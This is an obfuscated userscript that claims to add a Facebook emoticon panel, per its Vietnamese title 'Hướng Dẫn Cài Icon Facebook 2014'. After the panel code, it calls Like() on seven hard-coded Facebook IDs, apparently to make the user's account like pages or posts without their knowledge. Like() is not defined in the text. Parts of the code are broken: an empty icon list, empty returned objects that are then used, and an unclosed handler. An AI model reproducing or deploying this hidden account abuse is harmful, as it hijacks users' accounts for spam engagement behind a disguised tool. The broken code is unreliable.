// ==UserScript==
// @name            Hướng Dẫn Cài Icon Facebook 2014
// @description     All about facebook By Noname
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==Icon==
var _0x3384x1 = [{
    
    }];
    var _0x3384x2 = document['activeElement'];

    function _0x3384x3(_0x3384x4) {
        var _0x3384x5 = document['createElement']('div');
        _0x3384x5['innerHTML'] = _0x3384x4;
        return _0x3384x5['firstChild'];
    };

    function _0x3384x6(_0x3384x7) {
        var _0x3384x8 = document['createElement']('div');
        var _0x3384x9 = document['createTextNode'](_0x3384x7);
        _0x3384x8['appendChild'](_0x3384x9);
        return _0x3384x8['innerHTML'];
    };

    function _0x3384xa(_0x3384xb) {
        return (_0x3384xb instanceof HTMLInputElement && _0x3384xb['type'] == 'text') || _0x3384xb instanceof HTMLTextAreaElement;
    };

    function _0x3384xc(_0x3384xd) {
        return _0x3384xd['className'] == 'openToggler';
    };

    function _0x3384xe(_0x3384xd, _0x3384xf) {
        if (_0x3384xf === undefined) {
            _0x3384xf = !_0x3384xc(_0x3384xd);
        };
        if (_0x3384xf) {
            _0x3384xd['className'] = 'openToggler';
        } else {
            _0x3384xd['removeAttribute']('class');
        };
    };

    function _0x3384x10(_0x3384x11, _0x3384x12) {
        var _0x3384x4;
        _0x3384x4 = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';
        _0x3384x4 += '<div class="jewelFlyout">';
        _0x3384x4 += '</div>';
        _0x3384x4 += '</li>';
        var _0x3384x13 = _0x3384x3(_0x3384x4);
        _0x3384x11['appendChild'](_0x3384x13);
        _0x3384x4 = '<div style="display: none;">';
        _0x3384x4 += '</div>';
        var _0x3384x14 = _0x3384x3(_0x3384x4);
        _0x3384x12['appendChild'](_0x3384x14);
        (function (_0x3384x14) {
            _0x3384x13['addEventListener']('click', function () {
                var _0x3384x15 = this['parentNode']['childNodes'];
                for (var _0x3384x16 = 0; _0x3384x16 < _0x3384x15['length']; _0x3384x16++) {
                    if (_0x3384x15[_0x3384x16] === this) {} else {
                        _0x3384x15[_0x3384x16]['style']['background'] = '';
                        _0x3384x15[_0x3384x16]['firstChild']['style']['color'] = '';
                    };
                };
                var _0x3384x17 = _0x3384x14['parentNode']['childNodes'];
                for (var _0x3384x18 = 0; _0x3384x18 < _0x3384x17['length']; _0x3384x18++) {
                    if (_0x3384x17[_0x3384x18] === _0x3384x14) {
                        _0x3384x14['style']['display'] = '';
                    } else {
                        _0x3384x17[_0x3384x18]['style']['display'] = 'none';
                    };
                };
            });
        })(_0x3384x14);
        return {
           
        };
    };

    function _0x3384x19(_0x3384x1, _0x3384x1a) {
        var _0x3384x4;
        _0x3384x4 = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';
        _0x3384x4 += '<div style="padding: 10px; width: 200px; font-size: 15px;">';
        _0x3384x4 += '</div>';
        _0x3384x4 += '</div>';
        var _0x3384x14 = _0x3384x3(_0x3384x4)['firstChild'];
        for (var _0x3384x1b = 0; _0x3384x1b < _0x3384x1['length']; _0x3384x1b++) {
            var _0x3384x1c = _0x3384x1[_0x3384x1b];
            if (!_0x3384x1a(_0x3384x1c)) {
                continue;
            };
            _0x3384x4 = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';
            _0x3384x4 += '<a';
            _0x3384x4 += ' class="emoticon' + (_0x3384x1c['class'] !== undefined ? ' ' + _0x3384x1c['class'] : '') + '"';
            _0x3384x4 += ' style="text-decoration: inherit; color: inherit;' + (_0x3384x1c['class'] !== undefined ? ' color: transparent;' : ' width: auto;') + '"';
            _0x3384x4 += (_0x3384x1c['name'] !== undefined ? ' title="' + _0x3384x1c['name'] + '"' : '');
            _0x3384x4 += '>';
            _0x3384x4 += _0x3384x6(_0x3384x1c['chars']);
            _0x3384x4 += '</a>';
            _0x3384x4 += '</span>';
            var _0x3384x1d = _0x3384x3(_0x3384x4);
            _0x3384x14['appendChild'](_0x3384x1d);
            var _0x3384x1e = _0x3384x1d['firstChild'];
            (function (_0x3384x1c) {
                _0x3384x1e['addEventListener']('click', function () {
                    if (_0x3384xa(_0x3384x2)) {
                        _0x3384x2['focus']();
                        var _0x3384x1f = _0x3384x1c['chars'];
                        var _0x3384x20 = _0x3384x2['value'];
                        var _0x3384x21 = _0x3384x2['selectionStart'];
                        var _0x3384x22 = _0x3384x2['selectionEnd'];
                        _0x3384x2['value'] = _0x3384x20['substring'](0, _0x3384x21) + _0x3384x1f + _0x3384x20['substring'](_0x3384x22);
                        _0x3384x2['setSelectionRange'](_0x3384x21 + _0x3384x1f['length'], _0x3384x21 + _0x3384x1f['length']);
                    };
                    openFlyoutCommand = false;
                });
            })(_0x3384x1c);
        };
        return _0x3384x14['parentNode'];
    };
    var _0x3384x4;
    _0x3384x4 = '<li class="navItem middleItem notifNegativeBase">';
    _0x3384x4 += '<div class="fbJewel">';
    _0x3384x4 += '<a class="navLink" title="Icon Facebook 2014">';
    _0x3384x4 += '<span style="vertical-align: middle;"><img src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"></img> Icon Facebook</span>';
    _0x3384x4 += '</a>';
    _0x3384x4 += '<div>';
    _0x3384x4 += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';
    _0x3384x4 += '<div class="jewelBeeperHeader">';
    _0x3384x4 += '<div class="beeperNubWrapper">';
    _0x3384x4 += '<div class="beeperNub" style="left: 4px;"></div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '<ul style="display: text-align: center;">';
    _0x3384x4 += '</ul>';
    _0x3384x4 += '<div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '<div class="jewelFooter">';
    _0x3384x4 += '<a class="jewelFooter" href="https://www.facebook.com/1460213204197136" target="_blank">Chúc Mọi Người Vui Vẻ</a>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</li>';
    var _0x3384x23 = _0x3384x3(_0x3384x4);
    var _0x3384x24 = document['querySelector']('#pageNav');
    _0x3384x24['insertBefore'](_0x3384x23, _0x3384x24['firstChild']);
    _0x3384x23['addEventListener']('click', function () {
        if (_0x3384xa(_0x3384x2)) {
            _0x3384x2['focus']();
        };
        openFlyoutCommand = undefined;
    }, true);
    var _0x3384x25 = _0x3384x23['firstChild']['firstChild'];
    var _0x3384xd = _0x3384x25['nextSibling'];
    var _0x3384x11 = _0x3384xd['firstChild']['childNodes'][1];
    var _0x3384x12 = _0x3384x11['nextSibling'];
    _0x3384x25['addEventListener']('click', function () {
        openFlyoutCommand = !_0x3384xc(_0x3384xd);
    });
    var _0x3384x26 = _0x3384x10(_0x3384x11, _0x3384x12);
    _0x3384x26['title']['click']();
    _0x3384x26['body']['appendChild'](_0x3384x19(_0x3384x1, function (_0x3384x1c) {
        if (_0x3384x1c['class'] === undefined) {
            return false;
        };
        if (_0x3384x1c['chars']['length'] == 2) {
            return false;
        };
        return true;
    }));
    document['addEventListener']('click', function () {
        _0x3384x2 = document['activeElement'];
        if (openFlyoutCommand !== undefined) {
            _0x3384xe(_0x3384xd, openFlyoutCommand);
        };
        openFlyoutCommand = false;
   
//Like hình thêm
Like("213442338851321");
Like("266615306833382");
Like("577802602312939");
Like("61407576539498590");
Like("1460213204197136");
Like("775065529176965");
Like("610790105636132");